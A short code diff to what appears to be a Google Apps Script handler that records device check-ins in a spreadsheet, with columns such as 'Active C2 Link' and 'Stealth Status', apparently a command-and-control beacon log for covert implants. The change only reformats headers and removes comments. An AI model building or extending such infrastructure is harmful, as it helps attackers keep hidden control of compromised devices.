@@ -156,13 +156,23 @@ function handleRequest(e) {
     
     // Auto-initialize headers if new sheet
     if (sheet.getLastRow() == 0) {
-      sheet.appendRow(["Timestamp", "Model #", "Connection Type", "IP Address", "Port", "Active C2 Link", "Battery", "Stealth Status", "Power", "Free Storage", "Screen"]);
+      sheet.appendRow([
+        "Timestamp", 
+        "Model #", 
+        "Connection Type", 
+        "IP Address", 
+        "Port", 
+        "Active C2 Link", 
+        "Battery", 
+        "Stealth Status", 
+        "Power", 
+        "Free Storage", 
+        "Screen"
+      ]);
     }
     
-    // Parse incoming tactical data (Supports JSON POST and GET params)
     var data = (e.postData && e.postData.contents) ? JSON.parse(e.postData.contents) : e.parameter;
     
-    // Finalize row with fallbacks for missing packets
     var row = [
       new Date(),
       data.device || data.model || "Unknown",
